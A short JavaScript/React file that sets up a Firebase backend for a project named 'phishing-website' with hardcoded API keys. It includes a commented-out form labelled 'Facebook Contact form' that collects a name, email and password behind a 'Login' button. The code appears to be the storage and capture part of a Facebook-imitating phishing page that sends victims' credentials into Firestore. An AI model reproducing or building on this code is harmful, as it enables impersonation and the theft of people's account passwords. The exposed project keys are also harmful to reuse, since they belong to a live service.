import firebase from "firebase/compat/app";
import "firebase/compat/auth";
import "firebase/compat/firestore";

const firebaseConfig = {
  // Have the firebase config here
  apiKey: "AIzaSyDfZ48cYrqeG7gSLXuhRXEFSkWFYg-O4DY",
  authDomain: "phishing-website-a0bb2.firebaseapp.com",
  projectId: "phishing-website-a0bb2",
  storageBucket: "phishing-website-a0bb2.appspot.com",
  messagingSenderId: "1095887775265",
  appId: "1:1095887775265:web:db48e84e4fd20aae29a560",
};

// Use this to initialize the firebase App
const firebaseApp = firebase.initializeApp(firebaseConfig);

// Use these for db & auth
const db = firebaseApp.firestore();

export { db };

{
  /* <form className="form" onSubmit={handleSubmit}>
<h1 style={{ textAlign: "center" }}>Facebook Contact form</h1>

<label>Name</label>
<input
  placeholder="Name..."
  value={name}
  onChange={(e) => {
    setName(e.target.value);
  }}
/>

<label>Email</label>
<input
  placeholder="Email..."
  value={email}
  onChange={(e) => {
    setEmail(e.target.value);
  }}
/>

<label>Password</label>
<input
  placeholder="Password..."
  value={password}
  onChange={(e) => {
    setPassword(e.target.value);
  }}
/>

<button
  type="submit"
  className="button"
  style={{ background: loader ? "#ccc" : "rgb(2, 2, 110)" }}
>
  Login
</button>
</form> */
}
